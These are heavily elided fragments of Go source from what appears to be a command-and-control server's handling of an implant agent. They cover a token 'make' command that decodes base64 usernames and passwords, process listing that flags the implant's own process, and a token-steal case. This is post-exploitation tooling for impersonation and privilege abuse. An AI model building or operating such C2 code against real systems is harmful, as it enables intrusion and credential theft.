		...
		if val, ok := Optional["SubCommand"].(string); ok {
			...
			case "make":
				...
				if val, ok = Optional["Arguments"].(string); ok {
					...
					if ArrayData[0] == "local" {
						Local = win32.TRUE
					} else if ArrayData[0] == "network" {
						Local = win32.FALSE
					} else {
						return job, errors.New("token make is nor network or local")
					}

					if UserDomain, err = base64.StdEncoding.DecodeString(ArrayData[1]); err != nil {
						return job, errors.New("Failed to decode UserDomain: " + err.Error())
					}
					if Password, err = base64.StdEncoding.DecodeString(ArrayData[2]); err != nil {
...
func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs RoutineFunc) {
	...
	case COMMAND_PROC_LIST:
		...
		for _, process := range Processlist {
			...
			if demon.Info.ProcessName == process.Name {
				ProcessTable += fmt.Sprintf(FormatTable + " %v\n", process.Name, process.PID, process.PPID, process.Session, ProcessArch, process.Threads, process.User, "<-- you are here")
			} else {
	...
	case COMMAND_TOKEN:
		...
		if Parser.Length() >= 4 {
			...
			case 0x2: // steal
				...
				Output["Type"] = "Good"
				Output["Message"] = fmt.Sprintf("Successful stole token from %v [%v]", TargetPID, User)
...
func (a* Agent) UpdateLastCallback() {
	a.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
}
